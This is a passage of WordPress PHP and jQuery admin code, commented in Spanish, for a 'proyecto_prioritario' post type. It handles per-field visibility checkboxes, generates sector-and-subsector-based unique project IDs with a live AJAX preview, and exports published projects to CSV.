        </form>
    </div>

    <script>
        jQuery(document).ready(function($){
            // Hacer sortable el tbody
            $('#campos-table tbody').sortable({
                axis: 'y',
                cursor: 'move',
                containment: 'parent',
                items: 'tr',
                opacity: 0.7
            });

            // Agregar fila nueva
            $('#agregar-fila').on('click', function () {
                const row = `
                    <tr>
                        <td><input type="text" name="campo_key[]"></td>
                        <td><input type="text" name="campo_label[]"></td>
                        <td><button type="button" class="button eliminar-fila">✖</button></td>
                    </tr>
                `;
                $('#campos-table tbody').append(row);
            });

            // Eliminar fila
            $(document).on('click', '.eliminar-fila', function () {
                $(this).closest('tr').remove();
            });
        });
    </script>
    <?php
}




add_action('add_meta_boxes', function() {
    add_meta_box(
        'visibilidad_campos',
        'Visibilidad de Campos',
        'render_visibilidad_campos_box',
        'proyecto_prioritario',
        'side',
        'high'
    );
});



function render_visibilidad_campos_box($post) {
    $campos = get_option('campos_visibilidad_proyecto', []);
	
	?>
    <p>
        <label>
            <input type="checkbox" id="marcar-todos" /> Marcar todos
        </label>
    </p>
    <?php

    foreach ($campos as $clave => $etiqueta) {
        $valor = get_post_meta($post->ID, "_mostrar_$clave", true);
        $checked = ($valor === '1') ? 'checked' : ''; // solo marcar si meta es '1'

        echo '<p><label>';
        echo '<input class="checkbox-individual" type="checkbox" name="mostrar_' . esc_attr($clave) . '" value="1" ' . $checked . '> ';
        echo esc_html($etiqueta);
        echo '</label></p>';
    }
	
	?>
    <script>
        jQuery(document).ready(function($){
            $('#marcar-todos').on('change', function(){
                $('.checkbox-individual').prop('checked', this.checked);
            });
        });
    </script>
    <?php
}



add_action('save_post_proyecto_prioritario', function($post_id) {
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) return;
    if (!current_user_can('edit_post', $post_id)) return;

    $campos = get_option('campos_visibilidad_proyecto', []);
    
    foreach ($campos as $clave => $etiqueta) {
        $meta_key = "_mostrar_$clave";
        
        if (isset($_POST["mostrar_$clave"])) {
            update_post_meta($post_id, $meta_key, '1');
        } else {
            update_post_meta($post_id, $meta_key, '0');  // guardar 0 en vez de eliminar
        }
    }
});


/*add_action('save_post_proyecto_prioritario', function($post_id) {
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) return;
    if (!current_user_can('edit_post', $post_id)) return;

    $campos = get_option('campos_visibilidad_proyecto', []);
    
    foreach ($campos as $clave => $etiqueta) {
        $meta_key_visibilidad = "_mostrar_$clave";
        $meta_key_dato = $clave; // se asume que el campo original se guarda con esta clave

        if (isset($_POST["mostrar_$clave"])) {
            update_post_meta($post_id, $meta_key_visibilidad, '1');
        } else {
            update_post_meta($post_id, $meta_key_visibilidad, '0');

            // Vaciar el valor del campo relacionado
            delete_post_meta($post_id, $meta_key_dato);
        }
    }
});*/



// Forzar ID único al guardar proyecto_prioritario
add_action('acf/save_post', 'forzar_id_unico_proyecto_final', 20);
function forzar_id_unico_proyecto_final($post_id) {
    if (get_post_type($post_id) !== 'proyecto_prioritario') return;

    // Obtener sector y subsector actuales
    $sector = wp_get_post_terms($post_id, 'sector_proyecto_p', ['fields' => 'ids']);
    $subsector = wp_get_post_terms($post_id, 'subsector_proyecto_p', ['fields' => 'ids']);

    $id_sector = (!empty($sector)) ? get_field('codigo_id', 'sector_proyecto_p_' . $sector[0]) ?: '00' : '00';
    $id_subsector = (!empty($subsector)) ? get_field('codigo_id', 'subsector_proyecto_p_' . $subsector[0]) ?: '00' : '00';

    $base_id_actual = $id_sector . $id_subsector;

    // Obtener el base guardado previamente para comparar (solo sector+subsector)
    $base_id_guardado = get_post_meta($post_id, 'id_unico_proyecto_base', true);
    $id_unico_actual = get_post_meta($post_id, 'id_unico_proyecto', true);

    // Si el ID ya existe y base no cambió, no actualizar nada
    if (!empty($id_unico_actual) && $base_id_guardado === $base_id_actual) {
        return; // nada que hacer
    }

    // Si llegamos aquí, o es nuevo, o cambió sector/subsector: generar nuevo ID

    // Obtener proyectos que ya tienen IDs con este sector+subsector
    $proyectos = get_posts([
        'post_type' => 'proyecto_prioritario',
        'posts_per_page' => -1,
        'post_status' => ['publish', 'draft', 'pending', 'private', 'future'], // TODOS los estados relevantes
        'meta_query' => [
            [
                'key' => 'id_unico_proyecto',
                'value' => '^' . $base_id_actual,
                'compare' => 'REGEXP'
            ]
        ]
    ]);

    $max_consecutivo = 0;
    foreach ($proyectos as $p) {
        $id = get_post_meta($p->ID, 'id_unico_proyecto', true);
        if (preg_match('/^' . $base_id_actual . '(\d{4})01$/', $id, $match)) {
            $num = intval($match[1]);
            if ($num > $max_consecutivo) $max_consecutivo = $num;
        }
    }

    $nuevo_consecutivo = str_pad($max_consecutivo + 1, 4, '0', STR_PAD_LEFT);
    $id_generado = $base_id_actual . $nuevo_consecutivo . '01';

    // Guardar ID único
    update_post_meta($post_id, 'id_unico_proyecto', $id_generado);
    // Guardar la base para futuras comparaciones
    update_post_meta($post_id, 'id_unico_proyecto_base', $base_id_actual);
}



// Mostrar ID en el listado del admin
add_filter('manage_proyecto_prioritario_posts_columns', function($columns) {
    $columns['id_unico_proyecto'] = 'ID Único Proyecto';
    return $columns;
});
add_action('manage_proyecto_prioritario_posts_custom_column', function($column, $post_id) {
    if ($column === 'id_unico_proyecto') {
        echo esc_html(get_post_meta($post_id, 'id_unico_proyecto', true));
    }
}, 10, 2);

// Pasar códigos a JavaScript
add_action('admin_footer-post.php', 'pasar_codigos_a_js');
add_action('admin_footer-post-new.php', 'pasar_codigos_a_js');
function pasar_codigos_a_js() {
    global $post;
    if (!$post || get_post_type($post) !== 'proyecto_prioritario') return;

    $sectores = get_terms('sector_proyecto_p', ['hide_empty' => false]);
    $subsectores = get_terms('subsector_proyecto_p', ['hide_empty' => false]);

    $sector_map = [];
    foreach ($sectores as $s) {
        $codigo = get_field('codigo_id', 'sector_proyecto_p_' . $s->term_id) ?: '00';
        $sector_map[$s->term_id] = $codigo;
    }
    $subsector_map = [];
    foreach ($subsectores as $s) {
        $codigo = get_field('codigo_id', 'subsector_proyecto_p_' . $s->term_id) ?: '00';
        $subsector_map[$s->term_id] = $codigo;
    }
    ?>
    <script>
    window.codigoSector = <?php echo json_encode($sector_map); ?>;
    window.codigoSubsector = <?php echo json_encode($subsector_map); ?>;
    </script>
    <?php
}

// Mostrar ID sugerido en vivo
add_action('acf/input/admin_footer', 'actualizar_id_en_vivo');
function actualizar_id_en_vivo() {
    global $post;
    if (!$post || get_post_type($post) !== 'proyecto_prioritario') return;

    $sectores = get_terms(['taxonomy' => 'sector_proyecto_p', 'hide_empty' => false]);
    $subsectores = get_terms(['taxonomy' => 'subsector_proyecto_p', 'hide_empty' => false]);

    $codigo_sector = [];
    $codigo_subsector = [];

    foreach ($sectores as $s) {
        $codigo_sector[$s->term_id] = get_field('codigo_id', 'term_' . $s->term_id) ?: '00';
    }
    foreach ($subsectores as $s) {
        $codigo_subsector[$s->term_id] = get_field('codigo_id', 'term_' . $s->term_id) ?: '00';
    }

    echo '<div id="id-unico-generado" class="acf-field"><p><strong>ID sugerido:</strong> <span>Esperando selección...</span></p></div>';
    ?>
    <script>
    window.codigoSector = <?php echo json_encode($codigo_sector); ?>;
    window.codigoSubsector = <?php echo json_encode($codigo_subsector); ?>;
    (function($){
        function actualizarID() {
            var sectorIDs = $('select[name="tax_input[sector_proyecto_p][]"]').val() || [];
            var subsectorIDs = $('select[name="tax_input[subsector_proyecto_p][]"]').val() || [];
            var sectorID = sectorIDs.length ? sectorIDs[0] : null;
            var subsectorID = subsectorIDs.length ? subsectorIDs[0] : null;
            var codigoSector = (sectorID && window.codigoSector[sectorID]) ? window.codigoSector[sectorID] : '00';
            var codigoSubsector = (subsectorID && window.codigoSubsector[subsectorID]) ? window.codigoSubsector[subsectorID] : '00';
            var base = codigoSector + codigoSubsector;

            if (codigoSector === '00' || codigoSubsector === '00') {
                mostrarID('Esperando selección válida...');
                return;
            }

            $.post(ajaxurl, { action: 'obtener_consecutivo_id', prefijo: base }, function(res) {
                let consecutivo = parseInt(res) + 1;
                let nuevoID = base + ('000' + consecutivo).slice(-4) + '01';
                mostrarID(nuevoID);
            }).fail(function() {
                mostrarID('Error al obtener ID.');
            });
        }

        function mostrarID(idTexto) {
            let contenedor = $('#id-unico-generado');
            if (!contenedor.length) {
                contenedor = $('<div id="id-unico-generado" class="acf-field"><p><strong>ID sugerido:</strong> <span></span></p></div>');
                $('.acf-field-taxonomy[data-name="subsector_proyecto_p"]').after(contenedor);
            }
            contenedor.find('span').text(idTexto);
        }

        $(document).ready(function(){
            actualizarID();
            $('select[name="tax_input[sector_proyecto_p][]"], select[name="tax_input[subsector_proyecto_p][]"]').on('change', actualizarID);
        });
    })(jQuery);
    </script>
    <?php
}

// AJAX para obtener el mayor consecutivo
add_action('wp_ajax_obtener_consecutivo_id', 'obtener_consecutivo_id');
function obtener_consecutivo_id() {
    $prefijo = sanitize_text_field($_POST['prefijo']);
    $posts = get_posts([
        'post_type' => 'proyecto_prioritario',
        'posts_per_page' => -1,
        'post_status' => 'publish',
        'meta_query' => [
            [
                'key' => 'id_unico_proyecto',
                'value' => "^{$prefijo}[0-9]{4}01$",
                'compare' => 'REGEXP'
            ]
        ]
    ]);

    $numeros = [];
    foreach ($posts as $p) {
        $id = get_field('id_unico_proyecto', $p->ID);
        if (preg_match("/^{$prefijo}(\d{4})01$/", $id, $m)) {
            $numeros[] = intval($m[1]);
        }
    }
    echo !empty($numeros) ? max($numeros) : 0;
    wp_die();
}

//
/*add_action('admin_menu', 'pagina_exportar_proyectos_csv');
function pagina_exportar_proyectos_csv() {
    add_menu_page(
        'Exportar Proyectos',
        'Exportar Proyectos Prioritarios',
        'manage_options',
        'exportar-proyectos-csv',
        'mostrar_pagina_exportacion',
        'dashicons-download',
        20
    );
}*/


//creamos el hook - cuando se esté generando la interfaz del listado de entradas en el admin (restrict_manage_posts), ejecuta la función boton_exportar_proyectos_prioritarios()
// el hook es un mencanismo que nos permite agregar o quitar funcionalidades de worpress sin alterar su nucelo
add_action('restrict_manage_posts', 'boton_exportar_proyectos_prioritarios'); 
function boton_exportar_proyectos_prioritarios($post_type) {
    if ($post_type === 'proyecto_prioritario') {
        $url = admin_url('admin-post.php?action=exportar_proyectos_csv');
        echo '<a href="' . esc_url($url) . '" class="button button-primary" style="margin-left:10px;">Exportar a CSV</a>';
    }
}

/*function mostrar_pagina_exportacion() {
    ?>
    <div class="wrap">
        <h1>Exportar Proyectos Publicados</h1>
        <p>Haz clic en el botón para descargar los proyectos publicados en formato CSV.</p>
        <form method="post" action="<?php echo admin_url('admin-post.php'); ?>">
            <input type="hidden" name="action" value="exportar_proyectos_csv">
            <?php submit_button('Exportar a CSV', 'primary'); ?>
        </form>
    </div>
    <?php
}*/


// Función auxiliar para obtener el nombre del término de una taxonomía
function obtener_termino_nombre($post_id, $taxonomia) {
    $terminos = wp_get_post_terms($post_id, $taxonomia, array('fields' => 'names'));
    return isset($terminos[0]) ? $terminos[0] : '';
}

add_action('admin_post_exportar_proyectos_csv', 'exportar_proyectos_csv');
function exportar_proyectos_csv() {
    if (!current_user_can('manage_options')) {
        wp_die('No tienes permisos suficientes para exportar.');
    }

    nocache_headers();

    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename=proyectos_publicados.csv');
    header('Pragma: no-cache');
    header('Expires: 0');

    $output = fopen('php://output', 'w');

    $proyectos = get_posts(array(
        'post_type' => 'proyecto_prioritario',
        'post_status' => 'publish',
        'posts_per_page' => -1
    ));

    if (empty($proyectos)) {
        fputcsv($output, array('No hay proyectos publicados'));
        fclose($output);
        exit;
    }

    // Obtener todos los meta keys usados en los proyectos para la cabecera
    $meta_keys = array();
    foreach ($proyectos as $p) {
        $metas = get_post_meta($p->ID);
        foreach ($metas as $key => $value) {
            if (!in_array($key, $meta_keys) && substr($key, 0, 1) !== '_') { // excluir meta internos de WP que comienzan con _
                $meta_keys[] = $key;
            }
        }
    }

    // Obtener las taxonomías asociadas al CPT
    $taxonomias = get_object_taxonomies('proyecto_prioritario', 'names');

    // Construir encabezado dinámico
    $header = array_merge(
        array('ID', 'Título'),
        $meta_keys,
        $taxonomias
    );
    fputcsv($output, $header);

    // Recorrer proyectos y llenar fila
    foreach ($proyectos as $proyecto) {
        $row = array(
            $proyecto->ID,
            get_the_title($proyecto->ID),
        );

        // Agregar valores meta (usar solo primer valor si hay varios)
        foreach ($meta_keys as $key) {
            $val = get_post_meta($proyecto->ID, $key, true);
            $row[] = is_array($val) ? implode(', ', $val) : $val;
        }

        // Agregar valores taxonomía (nombres separados por coma)
        foreach ($taxonomias as $tax) {
            $terms = wp_get_post_terms($proyecto->ID, $tax, array('fields' => 'names'));
            $row[] = !is_wp_error($terms) ? implode(', ', $terms) : '';
        }

        fputcsv($output, $row);
    }

    fclose($output);
    exit;
}







